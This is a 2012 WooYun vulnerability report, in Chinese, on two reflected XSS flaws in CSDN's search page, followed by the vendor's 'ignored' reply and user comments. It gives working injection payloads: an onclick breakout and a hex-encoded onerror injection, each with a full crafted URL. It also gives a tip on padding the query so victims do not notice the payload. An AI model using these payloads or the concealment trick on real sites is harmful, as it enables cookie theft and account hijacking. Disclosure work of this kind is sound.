{"id": 18224, "wybug_id": "wooyun-2012-010873", "wybug_title": "csdn论坛存在xss漏洞与利用技巧", "wybug_corp": "CSDN开发者社区", "wybug_author": "kamael", "wybug_date": "2012-08-14 00:15", "wybug_open_date": "2012-08-19 00:16", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： csdn某处存在反射型xss..刚才发了一个，这个是另外一种情况的，我把两个都写在这，那个没写详细，所以管理看到的话把刚那个删了吧。 详细说明：  漏洞页面时csdn的搜索 http://so.csdn.net/search? 存在两处不同的xss漏洞搜索的链接是\nhttp://so.csdn.net/search？utf8=%E2%9C%93&t=&q=xxx&commit=%E6%90%9C+%E7%B4%A2&sort=\n这里xxx是我们输入的内容。那么查看源文件来搜索这个字符串。我这里字符串为“aaa”1,第一处。在这个页面的几乎每个链接中，都有一个onclick动作，这个动作在点击搜索结果的标题中发生。看代码\n<a href=\"http://blog.csdn.net/walterhj/article/details/6070450\" onclick=\"click_log('blog','aaa','6070450')\" target=\"_blank\">Simware结合Cisco ACS的<span class=\"keyword\">AAA</span>实验</a>\n然后可以试探把\nonclick=\"click_log('blog','aaa','6070450')\"\n里的单引号和括号闭合，再写上我们自己的动作，这样用户点击搜索结果的时候就中招了。构造参数\naaaa');alert(/xss/)//\n然后得到链接\nhttp://so.csdn.net/search?utf8=%E2%9C%93&t=&q=aaaaaa')%3balert(%2fxss%2f)//&commit=%E6%90%9C+%E7%B4%A2&sort=\n。点击这个页面的任意搜索结果就可以弹出框框了。\n\n经尝试cookie也可以正常弹出。而且执行完onclick后会自动跳转到用户想要的结果处。当然我们可以把搜索请求的字符串弄长一些，把搜索框里的特殊字符给挤到后面让用户看不见，这样就可以神不知鬼不觉了。\n\n\n\n我这没多想，比如可以弄\n\"提高汇编语言水平除了王爽以外可以看哪些书');alert(/xss/)//\"\n这样的长字符串+代码来防止被用户发现。把这个字符串转成url码插到q参数后面就能达成不错的效果。2.第二处。搜索“aaa”的时候，我还发现在源文件最下方有一条这样的语句：\n<script>document.write(\"<img src=\\\"http://so.csdn.net/api/data/test/press?type=NewsTag&tagNames=aaa&page.size=15&page.autoCount=true&fields=description,created_at,id\\\"  border=0 width=0 height=0>\")</script>\n这句代码的作用是写一个图片链接出来。那么我们能不能构造一下把这个图片的链接闭合然后写个onerror动作呢？这个页面没有过滤反斜杠，那么我们可以用十六进制编码来绕过。\n\"onerror=\"alert(/xss/)\">的编码：\\x22\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x22\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x22\\x3e\n完整链接如下\nhttp://so.csdn.net/search?utf8=%E2%9C%93&t=&q=\\x22\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x22\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x22\\x3e&commit=%E6%90%9C+%E7%B4%A2&sort=\n这个与上面那个相比可以直接弹框，不过在我的电脑上加载的特别慢。\n\n   漏洞证明：  上面   修复方案：  加强过滤   版权声明：转载请注明来源 kamael@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-08-19 00:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-08-14 06:12 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  小伙子不错    \n     2012-08-14 10:37 |    \t\tkamael \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:7        | 。。。)\t\t \n  @风萧萧 额。。。求带    \n     2012-08-14 11:40 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  为啥我发的就不给过    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}